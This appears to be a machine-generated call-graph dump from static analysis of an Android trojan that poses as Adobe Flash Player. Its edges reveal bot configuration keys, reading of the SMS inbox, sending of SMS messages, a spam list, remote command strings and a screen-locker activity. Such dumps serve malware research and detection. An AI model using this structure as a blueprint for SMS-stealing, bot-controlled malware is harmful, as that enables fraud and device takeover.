VIRTUAL edge: virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r1) in <com.adobe.flashplayer_.FlashZ: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: $r8 = specialinvoke r0.<com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotLocation", $r4) in <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>
SPECIAL edge: specialinvoke $r54.<com.adobe.flashplayer_.FlashVirtual: void <init>()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.FlashVirtual: void <init>()>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r20 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $i0 = virtualinvoke r8.<java.lang.String: int indexOf(java.lang.String)>("forceZ") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: int indexOf(java.lang.String)>
STATIC edge: staticinvoke <java.lang.System: void exit(int)>(0) in <com.adobe.flashplayer_.AdobeFlashCore: void onCreate()> ==> <java.lang.System: void exit(int)>
STATIC edge: $r5 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r11) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: virtualinvoke r4.<java.lang.StringBuffer: java.lang.StringBuffer append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuffer: java.lang.StringBuffer append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r2) in <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r16 = virtualinvoke $r22.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r5) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $r0 = staticinvoke <java.util.Calendar: java.util.Calendar getInstance()>() in <com.adobe.flashplayer_.FlashURL: java.lang.String millisToDate(long)> ==> <java.util.Calendar: java.util.Calendar getInstance()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("\r") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke r8.<java.lang.String: int indexOf(java.lang.String)>("sendSMS") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: int indexOf(java.lang.String)>
VIRTUAL edge: $r24 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: r30 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: r4 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r1 = virtualinvoke r0.<com.adobe.flashplayer_.AdobeFlashCore: android.content.Intent getIntent()>() in <com.adobe.flashplayer_.AdobeFlashCore: android.os.IBinder onBind(android.content.Intent)> ==> <com.adobe.flashplayer_.AdobeFlashCore: android.content.Intent getIntent()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r8 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>("keyHttpGate[") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r24 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&f=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r22 = virtualinvoke r19.<java.lang.String: java.lang.String[] split(java.lang.String)>(" ") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String[] split(java.lang.String)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>(r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
CLINIT edge: staticinvoke <java.io.File: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <java.io.File: void <clinit>()>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashY: void saveData(java.lang.String,java.lang.String,android.content.Context)>($r14, $r6, $r1) in <com.adobe.flashplayer_.FlashY: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashY: void saveData(java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&d=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashURL: void saveData(java.lang.String,java.lang.String,android.content.Context)>(r4, "spamlist.txt", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void saveData(java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r21) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashURL: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>($r21, r4, $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>(r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r21 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r20 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
STATIC edge: r34 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>(r34) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: r4 = virtualinvoke $r19.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(":", "") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
VIRTUAL edge: $r21 = virtualinvoke $r19.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(":", "") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r3) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("\r") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke r3.<java.io.OutputStreamWriter: void write(java.lang.String)>($r2) in <com.adobe.flashplayer_.AdobeFlashCore: void writeConfig(java.lang.String,java.lang.String)> ==> <java.io.Writer: void write(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>($r17, $r14, $r20, $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: java.lang.String valueOf(java.lang.Object)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r1) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke $r23.<com.adobe.flashplayer_.FlashVirtual: android.os.AsyncTask execute(java.lang.Object[])>($r21) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
VIRTUAL edge: $z0 = virtualinvoke $r3.<java.lang.String: boolean equals(java.lang.Object)>($r4) in <com.adobe.flashplayer_.SystemSWF: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: boolean equals(java.lang.Object)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&d=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r17.<com.adobe.flashplayer_.Prefs$navW: void <init>(com.adobe.flashplayer_.Prefs,com.adobe.flashplayer_.Prefs$navW)>(r0, null) in <com.adobe.flashplayer_.Prefs: void <init>(android.content.Context,java.lang.String)> ==> <com.adobe.flashplayer_.Prefs$navW: void <init>(com.adobe.flashplayer_.Prefs,com.adobe.flashplayer_.Prefs$navW)>
VIRTUAL edge: virtualinvoke $r58.<com.adobe.flashplayer_.FlashVirtual: android.os.AsyncTask execute(java.lang.Object[])>($r24) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r30) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: $r12 = specialinvoke r0.<com.adobe.flashplayer_.FlashY: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotLocation", $r1) in <com.adobe.flashplayer_.FlashY: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashY: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: $r24 = virtualinvoke r3.<java.io.File: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.io.File: java.lang.String toString()>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&d=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r1) in <com.adobe.flashplayer_.adobeCore: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&c=") in <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke $r20.<java.lang.String: int indexOf(java.lang.String)>("a") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: int indexOf(java.lang.String)>
VIRTUAL edge: $r17 = virtualinvoke $r17.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&e=") in <com.adobe.flashplayer_.FlashY: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke $r0.<com.adobe.flashplayer_.AdobeFlashCore: void onCreate()>() in <dummyMainClass: com.adobe.flashplayer_.AdobeFlashCore dummyMainMethod_com_adobe_flashplayer___AdobeFlashCore(android.content.Intent)> ==> <com.adobe.flashplayer_.AdobeFlashCore: void onCreate()>
VIRTUAL edge: r5 = virtualinvoke $r56.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r21) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke r0.<com.adobe.packages.ZLocker: void setContentView(int)>(2130903042) in <com.adobe.packages.ZLocker: void onCreate(android.os.Bundle)> ==> <android.app.Activity: void setContentView(int)>
SPECIAL edge: specialinvoke $r3.<com.adobe.flashplayer_.MacrosStat$1: void <init>(com.adobe.flashplayer_.MacrosStat,long,long)>(r0, 180000L, 180000L) in <com.adobe.flashplayer_.MacrosStat: void onCreate()> ==> <com.adobe.flashplayer_.MacrosStat$1: void <init>(com.adobe.flashplayer_.MacrosStat,long,long)>
STATIC edge: r30 = staticinvoke <android.net.Uri: android.net.Uri parse(java.lang.String)>("content://sms/inbox") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <android.net.Uri: android.net.Uri parse(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r21) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r4 = virtualinvoke $r19.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(":", "") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
SPECIAL edge: $r10 = specialinvoke r0.<com.adobe.flashplayer_.FlashZ: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotVer", $r1) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashZ: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: virtualinvoke $r58.<com.adobe.flashplayer_.FlashVirtual: android.os.AsyncTask execute(java.lang.Object[])>($r24) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashURL: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>("w", "NOFILTER", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>(r34) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: virtualinvoke r4.<java.io.OutputStreamWriter: void close()>() in <com.adobe.flashplayer_.FlashZ: void saveData(java.lang.String,java.lang.String,android.content.Context)> ==> <java.io.OutputStreamWriter: void close()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r1) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r24) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: $r10 = specialinvoke r0.<com.adobe.flashplayer_.FlashW: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotNetwork", $r1) in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashW: java.lang.String readConfig(java.lang.String,android.content.Context)>
STATIC edge: $r5 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r11) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>("forcelock", "NONLOCK", $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.String: boolean contains(java.lang.CharSequence)>("ON") in <com.adobe.flashplayer_.Prefs: void <init>(android.content.Context,java.lang.String)> ==> <java.lang.String: boolean contains(java.lang.CharSequence)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>(r30) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke $r56.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r18) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r16) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $r35 = staticinvoke <android.telephony.SmsManager: android.telephony.SmsManager getDefault()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <android.telephony.SmsManager: android.telephony.SmsManager getDefault()>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&e=") in <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>("URL: ") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>("+") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r11 = virtualinvoke $r11.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>("*", "S") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
SPECIAL edge: $r9 = specialinvoke r0.<com.adobe.flashplayer_.FlashW: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotID", $r1) in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashW: java.lang.String readConfig(java.lang.String,android.content.Context)>
STATIC edge: r4 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>(r8) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke r19.<java.lang.String: int indexOf(java.lang.String)>("execMod") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: int indexOf(java.lang.String)>
STATIC edge: r34 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>(r34) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
STATIC edge: $r35 = staticinvoke <android.telephony.SmsManager: android.telephony.SmsManager getDefault()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <android.telephony.SmsManager: android.telephony.SmsManager getDefault()>
VIRTUAL edge: $i0 = virtualinvoke $r21.<java.lang.String: int length()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: int length()>
VIRTUAL edge: r5 = virtualinvoke $r56.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(".txt") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r6) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $r20 = staticinvoke <com.adobe.flashplayer_.AdobeUtil: java.lang.String millisToDate(long)>($l4) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: java.lang.String millisToDate(long)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("\r") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashURL: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>("MacrosATmp", r4, $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: $z0 = virtualinvoke r0.<com.adobe.flashplayer_.AdobeFlashCore: boolean isOnline()>() in <com.adobe.flashplayer_.AdobeFlashCore: void onCreate()> ==> <com.adobe.flashplayer_.AdobeFlashCore: boolean isOnline()>
SPECIAL edge: specialinvoke r0.<android.os.CountDownTimer: void <init>(long,long)>($l0, $l1) in <com.adobe.flashplayer_.AdobeUtil$1: void <init>(com.adobe.flashplayer_.AdobeUtil,long,long)> ==> <android.os.CountDownTimer: void <init>(long,long)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r22) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<com.adobe.flashplayer_.MacrosStat: void <init>()>() in <dummyMainClass: com.adobe.flashplayer_.MacrosStat dummyMainMethod_com_adobe_flashplayer___MacrosStat(android.content.Intent)> ==> <com.adobe.flashplayer_.MacrosStat: void <init>()>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashZ: void saveData(java.lang.String,java.lang.String,android.content.Context)>($r5, $r17, $r1) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashZ: void saveData(java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: r4 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeFlashCore: void writeConfig(java.lang.String,java.lang.String)>("Reich_SMSGate", r1) in <com.adobe.flashplayer_.AdobeFlashCore: void onCreate()> ==> <com.adobe.flashplayer_.AdobeFlashCore: void writeConfig(java.lang.String,java.lang.String)>
SPECIAL edge: specialinvoke $r58.<com.adobe.flashplayer_.FlashVirtual: void <init>()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashVirtual: void <init>()>
VIRTUAL edge: $r10 = virtualinvoke r0.<com.adobe.flashplayer_.AdobeFlashCore: android.content.Context getApplicationContext()>() in <com.adobe.flashplayer_.AdobeFlashCore: void onCreate()> ==> <android.content.ContextWrapper: android.content.Context getApplicationContext()>
SPECIAL edge: $r24 = specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>("BotPhone") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&c=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>(r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r20 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
